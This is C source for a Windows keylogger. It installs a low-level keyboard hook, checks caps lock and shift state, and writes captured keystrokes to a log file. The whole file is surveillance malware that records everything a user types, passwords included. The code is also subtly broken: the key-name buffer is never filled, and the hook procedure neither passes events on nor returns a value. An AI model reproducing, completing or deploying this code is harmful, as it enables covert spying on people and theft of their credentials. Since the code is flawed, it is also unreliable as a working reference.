#include"Header.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	UnhookWindowsHookEx(hHook);
}

BOOL isCaps(void) {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x800) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 32))
			iKey |= 0x1 << 24;
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		if (wcslen(KeyString) > 1) {
			WriteToFile(L"[");
			WriteToFile(KeyString);
			WriteToFile(L"]");
		}
		else {
			if (!isCaps()) KeyString[0] = tolower(KeyString[0]);

		}
	}
}